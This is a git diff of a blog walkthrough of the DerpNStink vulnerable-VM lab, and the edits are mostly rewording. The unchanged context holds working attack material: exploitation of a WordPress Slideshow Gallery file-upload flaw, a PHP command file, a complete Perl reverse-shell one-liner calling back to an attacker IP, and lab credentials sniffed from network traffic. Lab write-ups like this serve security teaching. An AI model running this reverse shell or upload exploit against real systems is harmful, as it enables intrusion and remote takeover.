@@ -150,11 +150,12 @@ PING derpnstink.local (127.0.0.1) 56(84) bytes of data.
 rtt min/avg/max/mdev = 0.015/0.022/0.026/0.003 ms
 stinky@DeRPnStiNK:~$
 ```
-I'm able to infer the following from `/webnotes`:
+
+The information from `/webnotes` tells us the following:
 
 * The FQDN of the host is `derpnstink.local`; and
-* User `stinky` exists; and
-* DocumentRoot is at `/var/www/html`.
+* DocumentRoot is at `/var/www/html`; and
+* User `stinky` exists.
 
 ### Directory/File Enumeration
 
@@ -194,6 +195,7 @@ Location: http://derpnstink.local/weblog/
 Content-Length: 0
 Content-Type: text/html; charset=UTF-8
 ```
+
 There's another hint from `/webnotes/info.txt` to do likewise.
 
 ```
@@ -202,7 +204,7 @@ There's another hint from `/webnotes/info.txt` to do likewise.
 
 ### Slideshow Gallery < 1.4.7 Arbitrary File Upload
 
-Using `wpscan` to identify vulnerable WordPress plugins, I'm able to find this particular version (1.4.6) that has an arbitrary file upload [vulnerability](https://www.exploit-db.com/exploits/34514/).
+Using `wpscan` to identify vulnerable WordPress plugins, I'm able to find a particular version (1.4.6) that has an arbitrary file upload [vulnerability](https://www.exploit-db.com/exploits/34514/), installed in WordPress.
 
 I wrote `upload.sh`, a `bash` script to upload files based on the vulnerability.
 
@@ -249,7 +251,7 @@ curl \
 rm -rf cookie
 {% endhighlight %}
 
-Let's upload, with the script, a simple PHP file that executes remote command.
+I upload a simple PHP file that executes remote command, with the script.
 
 ```
 # cat cmd.php
@@ -260,9 +262,9 @@ Let's upload, with the script, a simple PHP file that executes remote command.
 
 The uploaded file is at `http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php`.
 
-### Low Privilege Shell
+### Low-Privilege Shell
 
-After the upload, the next step is to trigger a reverse shell. Whenever possible, I like to use Perl for my reverse shell.
+After the upload, the next step is to trigger a reverse shell. Whenever possible, I like to use Perl for my reverse shell; the reason being Perl is widely available in most Linux distributions.
 
 ```perl
 perl -e 'use Socket;$i="192.168.10.129";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -284,7 +286,7 @@ Let's spawn a pseudo-TTY for better display and output control.
 
 ### Database Dump
 
-Now that I've access to a low privilege shell, let's dump the WordPress database. I should be able to locate the database configuration parameters in the WordPress directory.
+Now that I've access to a low-privilege shell, let's dump the WordPress database. I should be able to locate the database configuration parameters in the WordPress directory.
 
 ![screenshot-3](/assets/images/posts/derpnstink-walkthrough/screenshot-3.png)
 
@@ -348,7 +350,7 @@ Let's see if we can log in to Uncle Stinky's account with the password (`wedgie5
 
 I discover the third flag at `/home/stinky/Desktop/flag.txt` during enumeration of Uncle Stinky's account.
 
-Moving further, I uncover a conversation between Mr. Derp and Uncle Stinky. It appears that Mr. Derp can't log in to WordPress and Uncle Stinky has captured network traffic to assist in troubleshooting the issue.
+Moving on, I uncover a conversation between Mr. Derp and Uncle Stinky. It appears that Mr. Derp can't log in to WordPress and Uncle Stinky has captured network traffic to assist in troubleshooting the issue.
 
 ```
 $ cd ~/ftp/files/network-logs
@@ -376,11 +378,12 @@ log=unclestinky%40derpnstink.local&pwd=wedgie57&wp-submit=Log+In&redirect_to=htt
 log=mrderp&pwd=derpderpderpderpderpderpderp&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1
 log=unclestinky%40derpnstink.local&pwd=wedgie57&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1
 ```
+
 Let's log in to Mr. Derp's account with the password (`derpderpderpderpderpderpderp`) we recover from the packet capture.
 
 ![screenshot-5](/assets/images/posts/derpnstink-walkthrough/screenshot-5.png)
 
-I uncover a helpdesk ticket during enumeration of Mr. Derp's account. Apparently, Mr. Derp has an issue with `sudoer`.
+I also uncover a helpdesk ticket during enumeration of Mr. Derp's account. Apparently, Mr. Derp has an issue with `sudoer`.
 
 ```
 $ cd /support
